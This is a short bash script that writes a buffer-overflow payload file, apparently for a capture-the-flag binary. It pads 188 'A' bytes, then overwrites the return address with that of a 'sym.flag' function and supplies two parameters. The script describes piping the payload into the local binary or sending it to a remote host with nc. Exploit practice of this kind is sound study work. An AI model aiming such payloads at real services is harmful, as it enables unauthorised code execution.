#!/bin/bash

#   Copyright (C) 2020 Michele De Donno

#   % ============================== LICENSE ============================== %
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>
#   % ====================================================================== %


#   % ======================= DESCRIPTION AND USAGE ======================= &
#     Bash script that generates the payload for the
#     Buffer Overflow of a function that requires 2 
#     parameters and that has an EIP offset of 188
#
#     The payload can then be used with the following commands:
#             $ cat payload.bin | ./binary-to-exploit
#             $ cat payload.bin | nc remotehost xxxx
#
#
#     Note 1: addresses are expressed in little endian 
#             and have been generated using the pwntools
#	            python library (http://docs.pwntools.com/en/stable/)
#	            as shown below.
#		          
#              $ python2.7
#		            >>> from pwn import *
#		            >>> p32(0xdeadbeef)
#		            '\xef\xbe\xad\xde'
#		            >>> p32(0xc0ded00d)
#		            '\r\xd0\xde\xc0
#
#     Note 2: echo can also be used instead of printf:
#		           $ echo -n -e "<string>" >> <file>
#
#   % ====================================================================== %

fname="payload.bin"
rm -f $fname
touch $fname
# 188 characters 'A' for generating buffer overflow
for i in {1..188}; do printf "%b" "\x41" >> $fname; done
# Address of sym.flag function (0x080491e2)
printf "%b" "\xe2\x91\x04\x08" >> $fname
# Return address: we chose 0x080492fe
printf "%b" "\xfe\x92\x04\x08" >> $fname
#echo -n -e "\xfe\x92\x04\x08" >> $fname
# par 1 addr (0xdeadbeef)
printf "%b" "\xef\xbe\xad\xde" >> $fname
# par 2 addr (0xc0ded00d)
printf "%b" "\r\xd0\xde\xc0" >> $fname
# endline
printf "%b" "\n" >> $fname
#echo -n -e "\n" >> $fname

echo "Payload saved in $fname:"
hexdump payload.bin
